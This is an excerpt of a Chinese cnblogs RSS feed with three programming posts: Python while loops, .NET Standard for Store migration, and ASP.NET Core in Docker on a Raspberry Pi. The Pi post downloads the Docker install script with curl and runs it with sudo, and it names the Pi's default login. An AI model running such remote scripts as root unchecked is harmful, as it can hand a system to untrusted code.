&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;可使用while 循环让程序在用户愿意时不断地运行，我们在其中定义了一个退出值，只要用户输入的不是这个值，程序就接着运行&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
prompt = &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;\nTell me something, and I will repeat it back to you:&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
prompt &lt;/span&gt;+= &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;\nEnter 'quit' to end the program. &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
message &lt;/span&gt;= &lt;span&gt;&quot;&quot;&lt;/span&gt;
&lt;span&gt;while&lt;/span&gt; message != &lt;span&gt;'&lt;/span&gt;&lt;span&gt;quit&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;:
　　message &lt;/span&gt;=&lt;span&gt; input(prompt)
　　&lt;/span&gt;&lt;span&gt;if&lt;/span&gt; message != &lt;span&gt;'&lt;/span&gt;&lt;span&gt;quit&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;:
　　　　&lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(message)
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;在要求很多条件都满足才继续运行的程序中，可定义一个变量，用于判断整个程序是否处于活动状态。这个变量被称为&lt;span&gt;&lt;strong&gt;标志&lt;/strong&gt;&lt;/span&gt; ，充当了程序的交通信号灯。你可让程序在标志为True 时继续运行，并在任何事件导致标志的值为False 时让程序停止运行。这样，在while 语句中就只需检查一个条件——标志的当前值是否为True ，并将所有测试（是否发生了应将标志设置为False 的事件）都放在其他地方，从而让程序变得更为整洁。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
prompt = &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;\nTell me something, and I will repeat it back to you:&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
prompt &lt;/span&gt;+= &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;\nEnter 'quit' to end the program. &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
active &lt;/span&gt;=&lt;span&gt; True # 标志
&lt;/span&gt;&lt;span&gt;while&lt;/span&gt;&lt;span&gt; active:
　　message &lt;/span&gt;=&lt;span&gt; input(prompt)
　　&lt;/span&gt;&lt;span&gt;if&lt;/span&gt; message == &lt;span&gt;'&lt;/span&gt;&lt;span&gt;quit&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;:
　　　　active &lt;/span&gt;=&lt;span&gt; False
　　&lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;:
　　　　&lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(message)
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;要立即退出while 循环，不再运行循环中余下的代码，也不管条件测试的结果如何，可使用&lt;span&gt;&lt;strong&gt;break&lt;/strong&gt;&lt;/span&gt; 语句。break 语句用于控制程序流程，可使用它来控制哪些代码行将执行，哪些代码行不执行，从而让程序按你的要求执行你要执行的代码。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
prompt = &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;\nPlease enter the name of a city you have visited:&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
prompt &lt;/span&gt;+= &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;\n(Enter 'quit' when you are finished.) &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;
&lt;span&gt;while&lt;/span&gt;&lt;span&gt; True:
　　city &lt;/span&gt;=&lt;span&gt; input(prompt)
　　&lt;/span&gt;&lt;span&gt;if&lt;/span&gt; city == &lt;span&gt;'&lt;/span&gt;&lt;span&gt;quit&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;:
　　　　&lt;/span&gt;&lt;span&gt;break&lt;/span&gt;
　　&lt;span&gt;else&lt;/span&gt;&lt;span&gt;:
　　　　&lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;I'd love to go to &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; + city.title() + &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;!&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;)
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;注意：&lt;/strong&gt;&lt;/span&gt;在任何Python循环中都可使用break 语句。例如，可使用break 语句来退出遍历列表或字典的for 循环。&lt;/p&gt;
&lt;p&gt;要返回到循环开头，并根据条件测试结果决定是否继续执行循环，可使用&lt;strong&gt;&lt;span&gt;continue&lt;/span&gt;&lt;/strong&gt; 语句，它不像break 语句那样不再执行余下的代码并退出整个循环。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
current_number =&lt;span&gt; 0
&lt;/span&gt;&lt;span&gt;while&lt;/span&gt; current_number &amp;lt; 10&lt;span&gt;:
　　current_number &lt;/span&gt;+= 1
　　&lt;span&gt;if&lt;/span&gt; current_number % 2 ==&lt;span&gt; 0:
　　　　&lt;/span&gt;&lt;span&gt;continue&lt;/span&gt;
　　&lt;span&gt;print&lt;/span&gt;(current_number)
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;if 语句检查current_number 与2的求模运算结果。如果结果为0（意味着current_number 可被2整除），就执行continue 语句，让Python忽略余下的代码，并返回到循环的开头。如果当前的数字不能被2整除，就执行循环中余下的代码，Python将这个数字打印出来&lt;/p&gt;
&lt;h2&gt;四、使用while 循环来处理列表和字典&lt;/h2&gt;
&lt;p&gt;for 循环是一种遍历列表的有效方式，但在for 循环中不应修改列表，否则将导致Python难以跟踪其中的元素。要在遍历列表的同时对其进行修改，可使用while 循环。通过将while 循环同列表和字典结合起来使用，可收集、存储并组织大量输入，供以后查看和显示&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;在列表之间移动元素：假设有一个列表，其中包含新注册但还未验证的网站用户；验证这些用户后，如何将他们移到另一个已验证用户列表中呢？一种办法是使用一个while 循环，在验证用户的同时将其从未验证用户列表中提取出来，再将其加入到另一个已验证用户列表中。代码可能类似于下面这样：&lt;/li&gt;
&lt;/ul&gt;&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 首先，创建一个待验证用户列表&lt;/span&gt;&lt;span&gt;
#&lt;/span&gt;&lt;span&gt; 和一个用于存储已验证用户的空列表&lt;/span&gt;
unconfirmed_users = [&lt;span&gt;'&lt;/span&gt;&lt;span&gt;alice&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;brian&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;candace&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;]
confirmed_users &lt;/span&gt;=&lt;span&gt; []
&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 验证每个用户，直到没有未验证用户为止&lt;/span&gt;&lt;span&gt;
#&lt;/span&gt;&lt;span&gt; 将每个经过验证的列表都移到已验证用户列表中&lt;/span&gt;
&lt;span&gt;while&lt;/span&gt;&lt;span&gt; unconfirmed_users:
　　current_user &lt;/span&gt;=&lt;span&gt; unconfirmed_users.pop()
　　&lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Verifying user: &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; +&lt;span&gt; current_user.title())
　　confirmed_users.append(current_user)
&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 显示所有已验证的用户&lt;/span&gt;
&lt;span&gt;print&lt;/span&gt;(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;\nThe following users have been confirmed:&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;for&lt;/span&gt; confirmed_user &lt;span&gt;in&lt;/span&gt; confirmed_users:&lt;br/&gt;　　print(confirmed_user.title())
&lt;/pre&gt;&lt;/div&gt;
&lt;ul&gt;&lt;li&gt;删除包含特定值的所有列表元素：我们可以使用函数remove() 来删除列表中的特定值，但每次只能删除一个，如果要删除列表中所有包含特定值的元素，该怎么办呢？假设你有一个宠物列表，其中包含多个值为'cat' 的元素。要删除所有这些元素，可不断运行一个while 循环，直到列表中不再包含值'cat' ，如下所示：&lt;/li&gt;
&lt;/ul&gt;&lt;div class=&quot;cnblogs_code&quot; readability=&quot;39&quot;&gt;
&lt;pre&gt;
pets = [&lt;span&gt;'&lt;/span&gt;&lt;span&gt;dog&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;cat&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;dog&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;goldfish&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;cat&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;rabbit&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;cat&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;]
&lt;/span&gt;&lt;span&gt;print&lt;/span&gt;&lt;span&gt;(pets)
&lt;/span&gt;&lt;span&gt;while&lt;/span&gt; &lt;span&gt;'&lt;/span&gt;&lt;span&gt;cat&lt;/span&gt;&lt;span&gt;'&lt;/span&gt; &lt;span&gt;in&lt;/span&gt;&lt;span&gt; pets:
　　pets.remove(&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;cat&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(pets)
&lt;/pre&gt;&lt;/div&gt;
&lt;ul&gt;&lt;li&gt;使用用户输入来填充字典：可使用while循环提示用户输入任意数量的信息。下面来创建一个调查程序，其中的循环每次执行时都提示输入被调查者的名字和回答。我们将收集的数据存储在一个字典中，以便将回答同被调查者关联起来：&lt;/li&gt;
&lt;/ul&gt;&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
responses =&lt;span&gt; {}
&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 设置一个标志，指出调查是否继续&lt;/span&gt;
polling_active =&lt;span&gt; True
&lt;/span&gt;&lt;span&gt;while&lt;/span&gt;&lt;span&gt; polling_active:
&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 提示输入被调查者的名字和回答&lt;/span&gt;
　　name = input(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;\nWhat is your name? &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
　　response &lt;/span&gt;= input(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Which mountain would you like to climb someday? &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
　　&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 将答卷存储在字典中&lt;/span&gt;
　　responses[name] =&lt;span&gt; response
　　&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 看看是否还有人要参与调查&lt;/span&gt;
　　repeat = input(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Would you like to let another person respond? (yes/ no) &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
　　&lt;/span&gt;&lt;span&gt;if&lt;/span&gt; repeat == &lt;span&gt;'&lt;/span&gt;&lt;span&gt;no&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;:
　　　　polling_active &lt;/span&gt;=&lt;span&gt; False
&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 调查结束，显示结果&lt;/span&gt;
&lt;span&gt;print&lt;/span&gt;(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;\n--- Poll Results ---&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;for&lt;/span&gt; name, response &lt;span&gt;in&lt;/span&gt;&lt;span&gt; responses.items():
　　&lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(name + &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt; would like to climb &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; + response + &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;)
&lt;/pre&gt;&lt;/div&gt;
</description>
<pubDate>Mon, 07 Jan 2019 15:52:00 +0000</pubDate>
<dc:creator>davieyang</dc:creator>
<og:description>一、摘要 本片博文将介绍input()函数和while循环的使用 二、input()函数 函数input() 让程序暂停运行，等待用户输入一些文本。获取用户输入后，Python将其存储在一个变量中，以</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/davieyang/p/10236646.html</dc:identifier>
</item>
<item>
<title>迁移桌面程序到MS Store（5）——.NET Standard - 楼上那个蜀黍</title>
<link>http://www.cnblogs.com/manupstairs/p/10236601.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/manupstairs/p/10236601.html</guid>
<description>&lt;p&gt;　　接下来的几篇，我想讨论下迁移桌面程序到MS Store，可以采用的比较常见、通用性比较强的实施步骤和分层架构。&lt;br/&gt;　　通常商业项目一般都是不断的迭代，不太可能突然停止更新现有的桌面版本，然后花很长时间从头来写UWP版本，所以我建议将迁移的过程分阶段，通过几个版本的迭代，慢慢地从传统桌面程序，转变成一个可以通过MS Store审核的APPX程序。至于之后要不要变成真·UWP可以视市场反馈决定。&lt;br/&gt;　　假设现有的桌面程序包含一个MainUI的WPF工程，多个.NET Framework 4.5的类库，以及一个C++编写的后台服务，以Windows Service的形式运行。之所以假设存在一个C++的Service,是考虑有些桌面程序要和硬件打交道，只有C语言版本的API。或者需要调用公司自己的通用类库，通常是C或C++写的跨平台版本。&lt;br/&gt;　　我推荐第一步，也是最简单的一步从.NET Framework类库着手改起。第一阶段的目标是将.NET Frramwork 4.5的类库，转换成.NET Standard 2.0版本的类库。&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/362529/201901/362529-20190107232837045-1090111509.png&quot; alt=&quot;&quot; width=&quot;855&quot; height=&quot;593&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　这里要着重介绍一下.NET Standard。MSDN上对于.NET Standard的解释虽然每个字都认识，可把这些字连成句子，读起来就不太容易看懂。&lt;br/&gt;　　&lt;a href=&quot;https://docs.microsoft.com/zh-cn/dotnet/standard/net-standard&quot; target=&quot;_blank&quot;&gt;https://docs.microsoft.com/zh-cn/dotnet/standard/net-standard&lt;/a&gt;&lt;br/&gt;　　总而言之呢，就是一个Class Library(.NET Standard)，它既可以被WPF工程引用，也可以被UWP工程引用，同时还可以被.NET Core的工程引用。&lt;br/&gt;　　在我们的例子中，因为我们的MainUI仍然是WPF的工程，所以不能直接将.NET Framework 4.5的Class Library转换成Universal Windows版本。同时我们又需要对未来可能存在的UWP版本提供支持，那么.NET Standard就是最佳的选择。&lt;br/&gt;　　在这种情况下，我们甚至可以在保留WPF的MainUI以支持Win 7（该死的老古董）的同时，新建一个UWP的UI工程来支持Win10。二者共用同一份的.NET Standard的Class Library。&lt;br/&gt;　　可能有些同学会问，同样一个C#的Class Library，为什么会有.NET Framework，Universal Windows，.NET Core和.NET Standard四种类型。下面我们来简单介绍以上几个概念，这些拗口的名称得感谢某软改名部八辈子祖宗，顺便问下还招人不？&lt;br/&gt;　　.NET Framework最为好懂，从2000年左右的.NET 1.0开始，现今已经发展到.NET 4.7.2。你说4.5以后怎么光升小版本号啊？啥时候出.NET 5啊？我说孩子你别傻了，.NET 5不就是.NET Core嘛？&lt;br/&gt;　　.NET Core，个人理解就是为了跨平台，重写的.NET Framework，也同样是为了跨平台，所以现阶段主打ASP.NET Core，而和Windows紧密结合的WPF，Winform，甚至UWP都是暂不支持的。毕竟在短时间内，重新写一份包含.NET 4.7.2所有功能的.NET Core不太现实。也没有迫切的需要。从GitHub的roadmap看，至少要到3.0版本才会支持UWP及桌面开发。&lt;br/&gt;　　&lt;a href=&quot;https://blogs.msdn.microsoft.com/dotnet/2018/05/07/net-core-3-and-support-for-windows-desktop-applications&quot; target=&quot;_blank&quot;&gt;https://blogs.msdn.microsoft.com/dotnet/2018/05/07/net-core-3-and-support-for-windows-desktop-applications&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/362529/201901/362529-20190107233014638-775099188.png&quot; alt=&quot;&quot; width=&quot;858&quot; height=&quot;823&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　Universal Windows class library就比较尴尬了，作为Win8那时候的Windows Runtime portable class library的Win10升级版。技术是好技术，可惜没赶上好时候。Win8和WP8的口碑不行，连累了Win10。简而言之就是给所有UWP程序用的class library。&lt;br/&gt;　　.NET Standard则是Universal Windows Class Library的跨平台再升级版。最终的大一统，今日的主角。&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/362529/201901/362529-20190107233106920-838252444.png&quot; alt=&quot;&quot; width=&quot;841&quot; height=&quot;547&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　上面这个表格看上去内容很多，实际我们仅仅需要看最后一列，使用最新的.NET Standard 2.0就可以了。抛去和我们迁移桌面程序关系不大的Mono，Xamarion和Unity，实际我们可以看到从.NET 4.6.1开始就已经支持.NET Standard 2.0了。从Windows 10版本来看的话，RS3的16299也已经是非常普及的版本了。&lt;br/&gt;　　升级到.NET Standard的好处非常明显，.NET Standard版本的类库可以在.NET Framework，UWP和.NET Core 之间共享，同时面向未来的升级做到无缝衔接。&lt;br/&gt;　　本着先易后难，循序渐进的原则，这一篇我们先讨论了什么是.NET Standard，以及升级的目的和意义。下一篇我们会介绍在升级.NET Framework到.NET Standard的过程中，可以使用的兼容性检测工具The .NET Portability Analyzer。顺便在展望一下.NET Core 3.0，一边写代码一边吹吹水，体验双倍的快乐！&lt;/p&gt;

</description>
<pubDate>Mon, 07 Jan 2019 15:37:00 +0000</pubDate>
<dc:creator>楼上那个蜀黍</dc:creator>
<og:description>接下来的几篇，我想讨论下迁移桌面程序到MS Store，可以采用的比较常见、通用性比较强的实施步骤和分层架构。 通常商业项目一般都是不断的迭代，不太可能突然停止更新现有的桌面版本，然后花很长时间从头来</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/manupstairs/p/10236601.html</dc:identifier>
</item>
<item>
<title>Asp.Net Core&amp;Docker部署到树莓派3B中 - 微笑刺客D</title>
<link>http://www.cnblogs.com/CKExp/p/10233780.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/CKExp/p/10233780.html</guid>
<description>&lt;p&gt;　　花了一点时间将吃灰数月的树莓派装上了Docker，并在容器中部署了一个Asp.Net Core应用程序，通过花生壳映射树莓派中的程序，可以使用外网访问树莓派，玩起来很有意思(外网访问地址：&lt;a href=&quot;http://2194cn9096.imwork.net/&quot; target=&quot;_blank&quot;&gt;http://2194cn9096.imwork.net/&lt;/a&gt;，访问不通可能树莓派断电了)，过程中发现了一点问题，或许对于同样路线的朋友有所帮助，特此写出玩转过程。&lt;/p&gt;
&lt;p&gt;　　码云Demo地址：&lt;a href=&quot;https://gitee.com/530521314/ControlEvent.git&quot; target=&quot;_blank&quot;&gt;https://gitee.com/530521314/ControlEvent.git&lt;/a&gt;&lt;/p&gt;

&lt;h3&gt;&lt;span&gt;&lt;strong&gt;一、树莓派安装操作系统&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;　　1、进入官网下载操作系统：&lt;a href=&quot;https://www.raspberrypi.org/downloads/&quot; rel=&quot;nofollow&quot; target=&quot;_blank&quot;&gt;https://www.raspberrypi.org/downloads/&lt;/a&gt;，我使用了官方的Raspbian系统，并且选择了无界面的轻量版&lt;strong&gt;Raspbian Stretch Lite.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1133736/201901/1133736-20190107215043655-2093497119.png&quot; alt=&quot;&quot;/&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　2、下载格式化SD卡的工具：&lt;a href=&quot;https://www.sdcard.org/downloads/formatter_4/eula_windows/&quot; rel=&quot;nofollow&quot; target=&quot;_blank&quot;&gt;https://www.sdcard.org/downloads/formatter_4/eula_windows/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;　　3、下载将系统烧录到SD卡中的工具Win32 DiskImager：&lt;a href=&quot;http://sourceforge.net/projects/win32diskimager/&quot; rel=&quot;nofollow&quot; target=&quot;_blank&quot;&gt;http://sourceforge.net/projects/win32diskimager/&lt;/a&gt;，选择系统磁盘路径地址，选择卡，然后执行Write即可，等待几分钟，便完成烧录工作&lt;/p&gt;
&lt;h4&gt; 　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1133736/201901/1133736-20190107215228392-1186981426.png&quot; alt=&quot;&quot;/&gt;&lt;/h4&gt;
&lt;p&gt;　　4、做一些配置工作，方便启动树莓派后可以快速玩转&lt;/p&gt;
&lt;p&gt;　　　4.1、启动SSH，在卡分区内创建一个名为ssh的文件夹即可&lt;/p&gt;
&lt;p&gt;　　　4.2、设置无线连接，本次我没有使用外接显示器到树莓派中，使用Putty工具直接无线连接，个人感觉更为方便，在卡内boot文件夹内，创建一个wpa_supplicant.conf的文件，并写下如下内容，该内容在树莓派通电后会由系统自动添加到/etc/wpa_supplicant/wpa_supplicant.conf中，设置完毕后便可以插入到树莓派，开始通电了&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
country=&lt;span&gt;CN
ctrl_interface&lt;/span&gt;=DIR=/&lt;span&gt;var&lt;/span&gt;/run/wpa_supplicant GROUP=&lt;span&gt;netdev
update_config&lt;/span&gt;=&lt;span&gt;1&lt;/span&gt;

&lt;span&gt;//&lt;/span&gt;&lt;span&gt;WiFi没有密码&lt;/span&gt;
network=&lt;span&gt;{
ssid&lt;/span&gt;=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;你的无线网络名称（ssid）&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
    key_mgmt&lt;/span&gt;=&lt;span&gt;NONE
}

&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;WiFi使用WEP加密&lt;/span&gt;
network=&lt;span&gt;{
    ssid&lt;/span&gt;=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;无线网络名称（ssid）&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
    key_mgmt&lt;/span&gt;=&lt;span&gt;NONE
    wep_key0&lt;/span&gt;=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;wifi密码&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
}

&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;WiFi使用WPA/WPA2加密&lt;/span&gt;
network=&lt;span&gt;{
    ssid&lt;/span&gt;=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;无线网络名称（ssid）&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
    key_mgmt&lt;/span&gt;=WPA-&lt;span&gt;PSK
    psk&lt;/span&gt;=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;wifi密码&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
}

&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;以我的举例(priority连接优先级最高)：&lt;/span&gt;
network=&lt;span&gt;{
    ssid&lt;/span&gt;=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Yang1802&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
    key_mgmt&lt;/span&gt;=WPA-&lt;span&gt;PSK
    psk&lt;/span&gt;=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;xxxxxxxx&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
    priority&lt;/span&gt;=&lt;span&gt;1&lt;/span&gt;&lt;span&gt;
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;　　　&lt;span&gt;4.3、使用Putty连接树莓派，树莓派ip地址可以找办法查看（如我使用的华为路由器，则可以登录路由器管理平台查看），使用账号pi，密码raspberry完成登录，开始校正树莓派时间&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 设置时区为 亚洲（Asia） 上海（Shanghai）&lt;/span&gt;
sudo dpkg-&lt;span&gt;reconfigure tzdata
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 启动 NTP 使计算机时钟与 Internet 时间服务器同步&lt;/span&gt;
sudo timedatectl &lt;span&gt;set&lt;/span&gt;-ntp &lt;span&gt;true&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt; 　　5、切换到root账号，方便操作&lt;/p&gt;


&lt;h3&gt;&lt;strong&gt;&lt;span&gt;二、树莓派安装Docker&lt;/span&gt;&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt; 　　1、开始安装Docker，由于树莓派使用的是ARM板，因此在安装Docker时，需要使用ARM板的安装教程：&lt;a href=&quot;https://docs.docker.com/install/linux/docker-ce/debian/#install-using-the-convenience-script&quot; target=&quot;_blank&quot;&gt;https://docs.docker.com/install/linux/docker-ce/debian/#install-using-the-convenience-script&lt;/a&gt;，使用提供的安装脚本完成安装即可，需要等待一些时间。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
$ curl -fsSL https:&lt;span&gt;//&lt;/span&gt;&lt;span&gt;get.docker.com -o get-docker.sh&lt;/span&gt;
$ sudo sh &lt;span&gt;get&lt;/span&gt;-docker.sh
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　2、安装Git工具，安装Git的目的是用于下载码云上的代码到树莓派中，虽然这个环节是有点冗余的，当我配置好了一台Jenkins服务器后，完全可以使用Jenkins服务器的功能将需要的镜像生产完成，因此这个环节就显得不这么重要了，但是，如果没有Jenkins服务器，那么这个环节就不得不进行了，毕竟需要将代码转移到树莓派中，或是开发环境中开发完毕，使用ftp转移到树莓派中等多种方式实现，使用如下命令安装git工具。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot;&gt;
&lt;pre&gt;
&lt;span&gt;sudo apt-get install&lt;/span&gt; git
&lt;/pre&gt;&lt;/div&gt;

&lt;h3&gt;&lt;strong&gt;&lt;span&gt;三、使用Dockerfile编译镜像并生成容器&lt;/span&gt;&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;　　 1、新建应用程序，按照约定的标准化应用程序构建方式完成项目搭建(前几篇文章中讲到了)，具体的项目结构可以从码云中查看。&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1133736/201901/1133736-20190107223344376-1768952529.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　2、增加Dockerfile并修改默认的Dockerfile内容，由于树莓派使用的是Arm板子，因此对于.net core运行环境也有所不同，在Dockerfile中需要指定发布目标平台，具体Dockerfile如下，使用的基础镜像可以从dotnet组织提供的示例中找到：&lt;a href=&quot;https://github.com/dotnet/dotnet-docker&quot; target=&quot;_blank&quot;&gt;https://github.com/dotnet/dotnet-docker&lt;/a&gt;，我针对该示例中有的Dockerfile做了一些改动，以适应项目结构的需要。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;FROM&lt;/span&gt; microsoft/dotnet:2.2&lt;span&gt;-sdk-stretch-arm32v7 AS build
&lt;/span&gt;&lt;span&gt;WORKDIR&lt;/span&gt;&lt;span&gt; /app

# copy csproj and restore as distinct layers
&lt;/span&gt;&lt;span&gt;COPY&lt;/span&gt;&lt;span&gt; ControlEvent.Web.csproj ./ControlEvent.Web/
&lt;/span&gt;&lt;span&gt;WORKDIR&lt;/span&gt;&lt;span&gt; /app/ControlEvent.Web
&lt;/span&gt;&lt;span&gt;RUN&lt;/span&gt;&lt;span&gt; dotnet restore

# copy and build app and libraries
&lt;/span&gt;&lt;span&gt;WORKDIR&lt;/span&gt;&lt;span&gt; /app/
